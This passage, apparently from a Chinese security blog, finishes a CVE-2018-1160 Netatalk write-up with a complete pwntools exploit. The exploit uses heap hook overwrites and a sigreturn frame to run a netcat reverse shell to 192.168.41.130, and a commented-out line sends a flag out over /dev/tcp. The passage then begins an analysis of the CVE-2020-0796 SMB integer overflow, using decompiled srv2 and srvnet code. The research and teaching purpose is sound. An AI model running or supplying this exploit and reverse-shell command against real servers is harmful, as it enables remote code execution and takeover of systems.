<p>有了任意地址写之后我们要如何控制执行流呢，按照CTF的思路看如果可以控制<code>__free_hook</code>以及free的对象就可以任意命令执行，但是在真实的漏洞环境里free的对象往往是不可控的，这里介绍一下hitcon的解法，实际上我们之前也用过类似的操作。</p>
<ol>
<li>覆写<code>__free_hook</code>为<code>__libc_dlopen_mode+56</code><br><img src="/2021/01/07/cve-2018-1160/1.png" alt></li>
<li>覆写<code>_dl_open_hook</code>为<code>_dl_open_hook+8</code>,<code>_dl_open_hook+8</code>为<code>fgetpos64+207</code>的这个magic_gadget，<code>mov    rdi,rax ; call   QWORD PTR [rax+0x20]</code>，此时因为rdi指向dl_open_hook。我们可以将dl_open_hook+0x20处修改为setcontext+53，从而实现任意函数执行。<br><img src="/2021/01/07/cve-2018-1160/2.png" alt></li>
<li>在dl_open_hook后面布置sigFrame，最终触发err时的free，调用system(cmd)执行反弹shell</li>
</ol>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><p>服务器offset和环境相关，可以再写个循环爆破偏移，我懒得调偏移了，所以只给个本地的exp</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"info"</span></span><br><span class="line">context.update(arch=<span class="string">"amd64"</span>,os=<span class="string">"linux"</span>)</span><br><span class="line"><span class="comment">#ip = 'localhost'</span></span><br><span class="line">ip = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">5566</span></span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_header</span><span class="params">(addr)</span>:</span></span><br><span class="line">    dsi_opensession = <span class="string">"\x01"</span> <span class="comment"># attention quantum option</span></span><br><span class="line">    dsi_opensession += chr(len(addr)+<span class="number">0x10</span>) <span class="comment"># length</span></span><br><span class="line">    dsi_opensession += <span class="string">"a"</span>*<span class="number">0x10</span>+addr</span><br><span class="line">    dsi_header = <span class="string">"\x00"</span> <span class="comment"># "request" flag</span></span><br><span class="line">    dsi_header += <span class="string">"\x04"</span> <span class="comment"># open session command</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x01"</span> <span class="comment"># request id</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># data offset</span></span><br><span class="line">    dsi_header += struct.pack(<span class="string">"&gt;I"</span>, len(dsi_opensession))</span><br><span class="line">    dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># reserved</span></span><br><span class="line">    dsi_header += dsi_opensession</span><br><span class="line">    <span class="keyword">return</span> dsi_header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_afp</span><span class="params">(idx,payload)</span>:</span></span><br><span class="line">    afp_command = chr(idx) <span class="comment"># invoke the second entry in the table</span></span><br><span class="line">    afp_command += <span class="string">"\x00"</span> <span class="comment"># protocol defined padding</span></span><br><span class="line">    afp_command += payload</span><br><span class="line">    dsi_header = <span class="string">"\x00"</span> <span class="comment"># "request" flag</span></span><br><span class="line">    dsi_header += <span class="string">"\x02"</span> <span class="comment"># "AFP" command</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x02"</span> <span class="comment"># request id</span></span><br><span class="line">    dsi_header += <span class="string">"\x00\x00\x00\x00"</span> <span class="comment"># data offset</span></span><br><span class="line">    dsi_header += struct.pack(<span class="string">"&gt;I"</span>, len(afp_command))</span><br><span class="line">    dsi_header += <span class="string">'\x00\x00\x00\x00'</span> <span class="comment"># reserved</span></span><br><span class="line">    dsi_header += afp_command</span><br><span class="line">    <span class="keyword">return</span> dsi_header</span><br><span class="line"></span><br><span class="line"><span class="comment">#addr = p64(0x7f812631d000)[:6]</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">addr = ""</span></span><br><span class="line"><span class="string">while len(addr)&lt;6 :</span></span><br><span class="line"><span class="string">    for i in range(256):</span></span><br><span class="line"><span class="string">        r = remote(ip,port)</span></span><br><span class="line"><span class="string">        r.send(create_header(addr+chr(i)))</span></span><br><span class="line"><span class="string">        try:</span></span><br><span class="line"><span class="string">            if "a"*4 in r.recvrepeat(1):</span></span><br><span class="line"><span class="string">                addr += chr(i)</span></span><br><span class="line"><span class="string">                r.close()</span></span><br><span class="line"><span class="string">                break</span></span><br><span class="line"><span class="string">        except:</span></span><br><span class="line"><span class="string">            r.close()</span></span><br><span class="line"><span class="string">    val = u64(addr.ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">    print hex(val)</span></span><br><span class="line"><span class="string">addr += "\x00"*2</span></span><br><span class="line"><span class="string">libc_addr = u64(addr)</span></span><br><span class="line"><span class="string">log.success("[+]Now we got an addresss &#123;&#125;".format(hex(libc_addr)))</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">libc_base = <span class="number">0x00007f50715b6000</span></span><br><span class="line">offset = <span class="number">0xca1000</span></span><br><span class="line"><span class="comment">#libc_base = libc_addr - offset</span></span><br><span class="line">log.success(<span class="string">"[+]libc base &#123;&#125;"</span>.format(hex(libc_base)))</span><br><span class="line">libc.address = libc_base</span><br><span class="line">raw_input()</span><br><span class="line"><span class="comment">#get shell</span></span><br><span class="line">free_hook = libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"><span class="comment"># mov    rdi,rax ; call   QWORD PTR [rax+0x20]</span></span><br><span class="line">magic = libc_base + <span class="number">0x7eaff</span></span><br><span class="line">dl_openmode = libc_base + <span class="number">0x166398</span></span><br><span class="line">dl_open_hook = libc_base + <span class="number">0x3f0588</span></span><br><span class="line"></span><br><span class="line">r = remote(ip,port)</span><br><span class="line">r.send(create_header(p64(free_hook<span class="number">-0x30</span>))) <span class="comment">#  overwrite afp_command buf with free_hook-0x30</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">rip=<span class="string">"127.0.0.1"</span></span><br><span class="line">rport=<span class="number">1234</span></span><br><span class="line"><span class="comment">#cmd='bash -c "cat /home/wz/flag &gt; /dev/tcp/%s/%d" \x00' % (rip,rport) # cat flag to controled ip and port</span></span><br><span class="line">cmd=<span class="string">'bash -c "nc 192.168.41.130 1234 -t -e /bin/bash" \x00'</span><span class="comment"># cat flag to controled ip and port</span></span><br><span class="line"></span><br><span class="line">sigframe = SigreturnFrame()</span><br><span class="line">sigframe.rdi = free_hook + <span class="number">8</span></span><br><span class="line">sigframe.rsi = <span class="number">0</span></span><br><span class="line">sigframe.rdx = <span class="number">0</span></span><br><span class="line">sigframe.rax = <span class="number">0</span></span><br><span class="line">sigframe.rsp = free_hook+<span class="number">0x400</span></span><br><span class="line">sigframe.rip = libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload =  <span class="string">'\x00'</span>*<span class="number">0x2e</span></span><br><span class="line">payload += p64(dl_openmode) <span class="comment"># free_hook</span></span><br><span class="line">payload += cmd.ljust(<span class="number">0x2c98</span>,<span class="string">'\x00'</span>)</span><br><span class="line">payload += p64(dl_open_hook+<span class="number">8</span>) + p64(magic)*<span class="number">4</span></span><br><span class="line">payload += p64(libc.sym[<span class="string">'setcontext'</span>]+<span class="number">53</span>)</span><br><span class="line">payload += str(sigframe)[<span class="number">0x28</span>:]</span><br><span class="line">r.send(create_afp(<span class="number">0</span>,payload))</span><br><span class="line">raw_input()</span><br><span class="line">r.send(create_afp(<span class="number">18</span>,<span class="string">""</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/2021/01/07/cve-2018-1160/3.png" alt></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://ruan777.github.io/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">Netatalk-CVE-2018-1160-分析</a></p>
<p><a href="https://medium.com/tenable-techblog/exploiting-an-18-year-old-bug-b47afe54172" target="_blank" rel="noopener">exploiting-an-18-year-old-bug</a></p>
<p><a href="https://balsn.tw/ctf_writeup/20191012-hitconctfquals/#netatalk" target="_blank" rel="noopener">hiton-2019-quals</a></p>
<p><a href="https://xz.aliyun.com/t/3710#toc-5" target="_blank" rel="noopener">Netatalk CVE-2018–1160 越界写漏洞分析</a></p>
]]></content>
  </entry>
  <entry>
    <title>CVE-2020-0796 windows SMB 内核提权漏洞复现与分析</title>
    <url>/2021/01/30/cve-2020-0796/</url>
    <content><![CDATA[<h1 id="CVE-2020-0796-windows-SMB-内核提权漏洞复现与分析"><a href="#CVE-2020-0796-windows-SMB-内核提权漏洞复现与分析" class="headerlink" title="CVE-2020-0796 windows SMB 内核提权漏洞复现与分析"></a>CVE-2020-0796 windows SMB 内核提权漏洞复现与分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前几天看到<code>a1ex</code>发了篇此漏洞的分析，之前想过分析这个win kernel的洞，不过没什么经验，刚好被我逮到一个可以问问题的2333，所以俺也来试着分析一下。</p>
<h2 id="双机调试环境搭建"><a href="#双机调试环境搭建" class="headerlink" title="双机调试环境搭建"></a>双机调试环境搭建</h2><p>唔貌似网上的资料很多，看a1ex的博客或者搜别的都可，这里不赘述了。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这个洞的影响非常大，我们之前分析的一些内核漏洞虽然也可以提权，但是很多在流行的发行版的内核中并不适用，而这个漏洞则可以在很多windows的发行版中直接使用，无需额外配置，这也是俺对它好奇的原因，因为第一次调win的洞，很多调试技巧和命令都多亏了<code>a1ex</code>教俺，非常感谢。</p>
<p>搭建好双机调试环境之后在windbg preview的attach kernel那里附加到我们的被调试机，下断点的时候如<code>bp srvNet!SrvNetAllocateBuffer</code>找不到符号文件的话可以开全局的代理而后使用<code>.reload</code>重新加载符号文件，此时windbg会自动从符号服务器上下载刚刚没有解析的符号文件pdb，有了这些pdb在IDA中看起来方便很多。这里用到了俩，<code>srvnet.pdb</code>和<code>srv2.pdb</code>，先从被调试机拷出来之后配合.pdb就可以分析了。</p>
<p><img src="/2021/01/30/cve-2020-0796/1.png" alt></p>
<p>首先了解一下smb协议，smb服务俺之前在实验室主机上搭过<code>samba</code>服务，这个其实就是<code>SMB</code>协议的实现，本篇分析主要是基于<code>启明星辰</code>和a1ex的文章分析，漏洞位于<code>srv2.sys</code>，Windows SMB v3.1.1 版本增加了对压缩数据的支持。下面为带压缩数据的SMB数据报文的构成。</p>
<p>前面是整个smb数据包的报头，中间是smb压缩数据包的包头。</p>
<p><img src="/2021/01/30/cve-2020-0796/2.png" alt></p>
<p>根据微软MS-SMB2协议文档，SMB Compression Transform Header的结构如下图所示。</p>
<p><img src="/2021/01/30/cve-2020-0796/3.png" alt></p>
<ol>
<li><p>ProtocolId ：4字节，必须0x424D53FC</p>
</li>
<li><p>OriginalComressedSegmentSize ：4字节，未压缩数据的大小</p>
</li>
<li><p>CompressionAlgorithm ：2字节，压缩算法，必须为下表中的某一个</p>
</li>
</ol>
<p><img src="/2021/01/30/cve-2020-0796/5.png" alt></p>
<ol start="4">
<li><p>Flags ：2字节，必须为<code>SMB2_COMPRESSION_FLAG_NONE</code>或者<code>SMB2_COMPRESSION_FLAG_CHAINED</code></p>
</li>
<li><p>Offset/Length ：如果Flags为<code>SMB2_COMPRESSION_FLAG_CHAINED</code>，这个字段被作为<code>Length</code>使用，其含义为压缩的payload的大小；否则这个字段被当作<code>Offset</code>使用，其含义为压缩数据段的开始到本结构尾的距离。</p>
</li>
</ol>
<p><img src="/2021/01/30/cve-2020-0796/4.png" alt></p>
<p>漏洞出现在对于压缩数据的处理上，该函数为<code>Srv2DecompressData</code>，调用<code>SrvNetAllocateBuffer</code>函数为解压缩的数据分配内存空间时候使用<code>OriginalComressedSegmentSize+Offset</code>作为函数参数，而这个参数的类型为<code>unsigned int</code>，即32位整数，存在整数溢出的问题，假如我们传入的参数为<code>0xffffffff+0x2</code>，则只会传入<code>1</code>来进行空间分配，最终产生溢出。这种有点类似我们之前做题遇到的base64解码前分配的空间不足导致溢出的pwn题。</p>
<p><code>SmbCompressionDecompress</code>这个解压缩函数最终会调用到<code>RtlDecompressBufferEx2</code>函数，通过<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-rtldecompressbufferex2" target="_blank" rel="noopener">RtlDecompressBufferEx2函数原型</a>可以反推测出<code>SmbCompressionDecompress</code>函数的参数。</p>
<ol>
<li>CompressAlog：压缩算法</li>
<li>CompressedBuffer：指向压缩数据包中的的压缩数据</li>
<li>CompressedBufferSize：压缩数据的大小</li>
<li>UncompressedBuffer：解压缩后数据的存储地址</li>
<li>UncompressedBufferSize：压缩数据的原始大小</li>
<li>FinalUncompressedSize：解压缩后的数据大小</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SmbCompressionDecompress</span><span class="params">(<span class="keyword">int</span> CompressAlog, __int64 CompressedBuffer, <span class="keyword">int</span> CompressedBufferSize, __int64 UncompressedBuffer, <span class="keyword">unsigned</span> <span class="keyword">int</span> UncompressedBufferSize, <span class="keyword">unsigned</span> <span class="keyword">int</span> *FinalUncompressedSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  PVOID WorkSpace; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// ecx</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// ecx</span></span><br><span class="line">  USHORT CompressionFormat; <span class="comment">// bx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v14; <span class="comment">// rsi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v15; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> CompressedBufferSize1; <span class="comment">// [rsp+20h] [rbp-48h]</span></span><br><span class="line">  ULONG CompressFragmentWorkSpaceSize[<span class="number">4</span>]; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  ULONG CompressBufferWorkSpaceSize; <span class="comment">// [rsp+70h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  CompressFragmentWorkSpaceSize[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  WorkSpace = <span class="number">0</span>i64;</span><br><span class="line">  CompressBufferWorkSpaceSize = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !CompressAlog )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-1073741637</span>;</span><br><span class="line">  v11 = CompressAlog - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v12 = v11 - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v12 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v12 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="number">-1073741637</span>;</span><br><span class="line">      CompressionFormat = <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      CompressionFormat = <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    CompressionFormat = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( RtlGetCompressionWorkSpaceSize(CompressionFormat, &amp;CompressBufferWorkSpaceSize, CompressFragmentWorkSpaceSize) &lt; <span class="number">0</span></span><br><span class="line">    || (WorkSpace = ExAllocatePoolWithTag((POOL_TYPE)<span class="number">512</span>, CompressBufferWorkSpaceSize, <span class="number">0x2532534C</span>u)) != <span class="number">0</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = FinalUncompressedSize;</span><br><span class="line">    CompressedBufferSize1 = CompressedBufferSize;</span><br><span class="line">    v15 = UncompressedBufferSize;</span><br><span class="line">    v10 = RtlDecompressBufferEx2(</span><br><span class="line">            CompressionFormat,</span><br><span class="line">            UncompressedBuffer,</span><br><span class="line">            UncompressedBufferSize,</span><br><span class="line">            CompressedBuffer,</span><br><span class="line">            CompressedBufferSize1,</span><br><span class="line">            <span class="number">4096</span>,</span><br><span class="line">            FinalUncompressedSize,</span><br><span class="line">            WorkSpace,</span><br><span class="line">            CompressFragmentWorkSpaceSize[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt;= <span class="number">0</span> )</span><br><span class="line">      *v14 = v15;</span><br><span class="line">    <span class="keyword">if</span> ( WorkSpace )</span><br><span class="line">      ExFreePoolWithTag(WorkSpace, <span class="number">0x2532534C</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v10 = <span class="number">-1073741670</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Srv2DecompressData按照参数加了注释，该函数的处理流程如下。</p>
<ol>
<li>从smb_packet数据包中提取出SMB Compression Transform Header记作smb_ct_header</li>
<li>smb_ct_header中根据偏移可以得到算法，通过<code>SrvNetAllocateBuffer(OriginalComressedSegmentSize+Offset)</code>分配内存空间，返回值为alloc_buf</li>
<li>调用<code>SmbCompressionDecompress(int CompressAlog, __int64 CompressedBuffer, int CompressedBufferSize, __int64 UncompressedBuffer, unsigned int UncompressedBufferSize, unsigned int *FinalUncompressedSize)</code>来进行解压缩，注意这里的参数4为<code>*(alloc_buf+0x18)+0x10</code>，即解压缩的数据位于alloc_buf+0x18的位置</li>
<li>比较解压缩的数据大小和原始数据大小是否一致，如果一致的话就调用memmove将解压缩的数据拷贝到*(alloc_buf+0x18)指向的地址处。</li>
<li>最后使用alloc_buf替换smb_packet。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">Srv2DecompressData</span><span class="params">(__int64 smb_packet)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 smb_ct_header; <span class="comment">// rax</span></span><br><span class="line">  __m128i v3; <span class="comment">// xmm0</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> CompressAlog; <span class="comment">// ebp</span></span><br><span class="line">  __int64 alloc_buf1; <span class="comment">// rax</span></span><br><span class="line">  __int64 alloc_buf; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __m128i Size; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> FinalUncompressedSize; <span class="comment">// [rsp+60h] [rbp+8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  FinalUncompressedSize = <span class="number">0</span>;</span><br><span class="line">  smb_ct_header = *(_QWORD *)(smb_packet + <span class="number">0xF0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(smb_ct_header + <span class="number">36</span>) &lt; <span class="number">0x10</span>u )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC000090B</span>i64;</span><br><span class="line">  Size = *(__m128i *)*(_QWORD *)(smb_ct_header + <span class="number">0x18</span>);<span class="comment">// tcp payload size</span></span><br><span class="line">  v3 = _mm_srli_si128(Size, <span class="number">8</span>);                 <span class="comment">// 右移动8个字节</span></span><br><span class="line">  CompressAlog = *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(smb_packet + <span class="number">0x50</span>) + <span class="number">496</span>i64) + <span class="number">140</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( CompressAlog != v3.m128i_u16[<span class="number">0</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC00000BB</span>i64;</span><br><span class="line">  alloc_buf1 = SrvNetAllocateBuffer((<span class="keyword">unsigned</span> <span class="keyword">int</span>)(Size.m128i_i32[<span class="number">1</span>] + v3.m128i_i32[<span class="number">1</span>]), <span class="number">0</span>i64);</span><br><span class="line">  alloc_buf = alloc_buf1;</span><br><span class="line">  <span class="keyword">if</span> ( !alloc_buf1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)SmbCompressionDecompress(</span><br><span class="line">              CompressAlog,</span><br><span class="line">              *(_QWORD *)(*(_QWORD *)(smb_packet + <span class="number">0xF0</span>) + <span class="number">24</span>i64) + Size.m128i_u32[<span class="number">3</span>] + <span class="number">16</span>i64,<span class="comment">// CompressedBuffer：payload+offset+0x10</span></span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(*(_DWORD *)(*(_QWORD *)(smb_packet + <span class="number">0xF0</span>) + <span class="number">36</span>i64) - Size.m128i_i32[<span class="number">3</span>] - <span class="number">16</span>),<span class="comment">// CompressedBufferSize:payload_size-offset-0x10</span></span><br><span class="line">              Size.m128i_u32[<span class="number">3</span>] + *(_QWORD *)(alloc_buf1 + <span class="number">0x18</span>),<span class="comment">// UncompressedBuffer:*(alloc_buf+0x18)+offset</span></span><br><span class="line">              Size.m128i_i32[<span class="number">1</span>],                <span class="comment">// UncompressedBufferSize:OriginalComressedSegmentSize字段</span></span><br><span class="line">              &amp;FinalUncompressedSize) &lt; <span class="number">0</span></span><br><span class="line">    || (v8 = FinalUncompressedSize, FinalUncompressedSize != Size.m128i_i32[<span class="number">1</span>]) )<span class="comment">// 注意这里的判断条件，最终解压缩之后的数据大小需要等于原来的字段中的解压缩数据大小</span></span><br><span class="line">  &#123;</span><br><span class="line">    SrvNetFreeBuffer(alloc_buf);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xC000090B</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( Size.m128i_i32[<span class="number">3</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    memmove(                                    <span class="comment">// 内存写入</span></span><br><span class="line">      *(<span class="keyword">void</span> **)(alloc_buf + <span class="number">0x18</span>),</span><br><span class="line">      (<span class="keyword">const</span> <span class="keyword">void</span> *)(*(_QWORD *)(*(_QWORD *)(smb_packet + <span class="number">0xF0</span>) + <span class="number">24</span>i64) + <span class="number">16</span>i64),<span class="comment">// payload+0x10</span></span><br><span class="line">      Size.m128i_u32[<span class="number">3</span>]);                       <span class="comment">// Offset</span></span><br><span class="line">    v8 = FinalUncompressedSize;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_DWORD *)(alloc_buf + <span class="number">0x24</span>) = Size.m128i_i32[<span class="number">3</span>] + v8;</span><br><span class="line">  Srv2ReplaceReceiveBuffer(smb_packet, alloc_buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<p>图的话比干讲形象很多，右边是alloc_buf，decompress的数据会拷贝到指定地址处，由于原本分配的大小较小，在拷贝的时候会产生溢出。</p>
<p><img src="/2021/01/30/cve-2020-0796/6.png" alt></p>
<p>在exp中给的数据为<code>0xffffffff+0x10</code>，即传入参数为9，我们看下分配的实际大小是多少。</p>
<p>我们的参数小于<code>0x1100</code>，直接从<code>SrvNetBufferLookasides[0]</code>获取内存，查看其相对引用，在<code>SrvNetCreateBufferLookasides</code>创建，该函数循环调用<code>SrvNetBufferLookasideAllocate</code>函数来分配内存，写个脚本看下分配的内存，大小为<code>0x1100 0x2100 0x4100 0x8100 0x10100 0x20100 0x40100 0x80100 0x100100 0x200100</code>，该函数实际上调用<code>SrvNetAllocateBufferFromPool</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">SrvNetAllocateBuffer</span><span class="params">(<span class="keyword">unsigned</span> __int64 alloc_sz, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// ebp</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// esi</span></span><br><span class="line">  __int16 v5; <span class="comment">// di</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v11; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v13; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v14; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v15; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v17; <span class="comment">// rcx</span></span><br><span class="line">  __int16 v18; <span class="comment">// ax</span></span><br><span class="line"></span><br><span class="line">  v2 = HIDWORD(KeGetPcr()[<span class="number">1</span>].LockArray);</span><br><span class="line">  idx = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( SrvDisableNetBufferLookAsideList || alloc_sz &gt; <span class="number">0x100100</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( alloc_sz &gt; <span class="number">0x1000100</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">    v11 = SrvNetAllocateBufferFromPool(alloc_sz, alloc_sz);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( alloc_sz &gt; <span class="number">0x1100</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v13 = alloc_sz - <span class="number">256</span>;</span><br><span class="line">      _BitScanReverse64((<span class="keyword">unsigned</span> __int64 *)&amp;v14, v13);</span><br><span class="line">      _BitScanForward64(&amp;v15, v13);</span><br><span class="line">      <span class="keyword">if</span> ( (_DWORD)v14 == (_DWORD)v15 )</span><br><span class="line">        idx = v14 - <span class="number">12</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        idx = v14 - <span class="number">11</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    v6 = SrvNetBufferLookasides[idx];</span><br><span class="line">    v7 = *(_DWORD *)v6 - <span class="number">1</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">SrvNetCreateBufferLookasides</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 *v0; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// er8</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// er9</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [rsp+30h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v0 = SrvNetBufferLookasides;</span><br><span class="line">  <span class="built_in">memset</span>(SrvNetBufferLookasides, <span class="number">0</span>, <span class="keyword">sizeof</span>(SrvNetBufferLookasides));</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = PplCreateLookasideList(</span><br><span class="line">           (<span class="keyword">int</span>)SrvNetBufferLookasideAllocate,</span><br><span class="line">           (<span class="keyword">int</span>)SrvNetBufferLookasideFree,</span><br><span class="line">           v1,</span><br><span class="line">           v2,</span><br><span class="line">           (<span class="number">1</span> &lt;&lt; (v3 + <span class="number">12</span>)) + <span class="number">256</span>,              <span class="comment">// 分配的内存的大小</span></span><br><span class="line">           <span class="number">0x3030534C</span>u,</span><br><span class="line">           v6,</span><br><span class="line">           <span class="number">0x6662534C</span>u);</span><br><span class="line">    *v0 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v3;</span><br><span class="line">    ++v0;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt;= <span class="number">9</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  SrvNetDeleteBufferLookasides();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3221225626</span>i64;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">__int64 <span class="title">SrvNetBufferLookasideAllocate</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> SrvNetAllocateBufferFromPool();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
